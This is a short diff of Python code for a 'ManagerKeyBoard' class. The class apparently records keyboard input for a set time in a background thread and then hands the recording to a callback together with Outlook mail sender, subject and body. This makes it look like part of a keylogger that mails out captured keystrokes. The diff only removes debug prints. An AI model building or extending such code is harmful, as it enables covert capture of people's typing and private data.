@@ -26,7 +26,6 @@ class ManagerKeyBoard(metaclass=SingletonMeta):
         return self.state
 
     def hook(self, _callBack=None, minute= 60):
-        self.repMail = self.mymail.getSender()
         print(self.mymail.__class__)
         print(OutLook.OutLook(None).__class__)
         if(self.mymail.__class__ == OutLook.OutLook(None).__class__ ):
@@ -36,16 +35,12 @@ class ManagerKeyBoard(metaclass=SingletonMeta):
 
     def hook_thread(self, _callBack=None, minute= 60):
         self.isHook = True
-        print("continute " + str(minute))
         thread = threading.Thread(target=self.update_hook)
         thread.start()
         time.sleep(minute)
         self.isHook = False
         thread.join()
-        print("stop recording")
-        print("repThread:" + str(self.repThread))
         rep = self.repThread
-        print("stop recording")
         if _callBack:
             _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), str(rep))
         if self.mymail:
